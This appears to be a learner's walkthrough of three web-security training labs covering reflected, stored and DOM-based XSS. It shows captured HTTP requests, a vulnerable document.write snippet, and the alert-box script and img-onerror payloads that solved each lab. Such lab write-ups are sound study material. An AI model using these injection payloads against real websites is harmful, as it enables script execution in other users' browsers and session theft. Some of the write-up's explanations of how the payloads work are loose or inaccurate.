# Lab 1: Reflected XSS into HTML context with nothing encoded

### In the below request searched a random alphanumeric string which stores in a parameter name with the value . We have to do HTML injection to enable reflected XSS.

**Request**
```http
GET /?search=hello123 HTTP/2
Host: 0a8400c804542ae9821147ee0025001f.web-security-academy.net
Cookie: session=REDACTED
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a8400c804542ae9821147ee0025001f.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```
### So we have to insert a html tag with our injected value , in search bar we can enter `<img src=x onerror=alert(1)>` or `<script>alert(1)</script>` which will produce an alert on the page displaying 1 .
- In `<img src=x onerror=alert(1)>` it'll create a blank image , and `onerror` will run whether it fails or create the image .
- Next `<script>alert(1)</script>` is a JS or HTML tag where we can insert anything to create it .

---

# Lab2: Stored XSS into HTML context with nothing encoded

### Commented on a post and caught the request.
```http
POST /post/comment HTTP/2
Host: 0a83008e0466d89e80e3a892000e001b.web-security-academy.net
Cookie: session=REDACTED
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 110
Origin: https://0a83008e0466d89e80e3a892000e001b.web-security-academy.net
Referer: https://0a83008e0466d89e80e3a892000e001b.web-security-academy.net/post?postId=7
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

csrf=8ZVfsXNLNxAM5SvnuSe0rZoi3JKmq7u8&postId=7&comment=very+useful&name=harry&email=harry%40gmail.com&website=
```

### Then I captured the blog post request to see whether it got updated.
**Request**
```http
GET /post?postId=7 HTTP/2
Host: 0a83008e0466d89e80e3a892000e001b.web-security-academy.net
Cookie: session=REDACTED
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a83008e0466d89e80e3a892000e001b.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive
```
### Got the updated requested .
**Request**
```http
            [...Remaining are omitted...]
                   <section class="comment">
                        <p>
                        <img src="/resources/images/avatarDefault.svg" class="avatar">                            harry | 18 November 2026
                        </p>
                        <p>very useful</p>
            [...Remaining are omitted...]

```
### Here I changed the comment to `<script>alert(1)</script>` and named another user so when the page reloads it runs the script .
```http
csrf=8ZVfsXNLNxAM5SvnuSe0rZoi3JKmq7u8&postId=7&comment=<script>alert(1)</script>&name=alice&email=alice%40gmail.com&website=
```
### And it worked after reloading the page .

# Lab3: DOM XSS in `document.write` sink using source `location.search`

### In the search bar typed a alphanumeric string and caught the request .
```http
GET /?search=hello123 HTTP/2
Host: 0acb00d304dff09180a5030f00d40059.web-security-academy.net
Cookie: session=REDACTED
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0acb00d304dff09180a5030f00d40059.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

### Saw a vulnerable javascript code and our search is storing inside a img file .
**Response**
```http
            [...Remaining are omitted...]
                   <script>
                        function trackSearch(query) {
                            document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
                        }
                        var query = (new URLSearchParams(window.location.search)).get('search');
                        if(query) {
                            trackSearch(query);
                        }
                    </script>
                    <img src="/resources/images/tracker.gif?searchTerms=hello123">
            [...Remaining are omitted...]

```
### As it's storing the input in a image file variable, we can exploit it by placing `"><img src=x onerror=alert(1)>` in the search bar, where it will create a new img tag , which will create the alert .
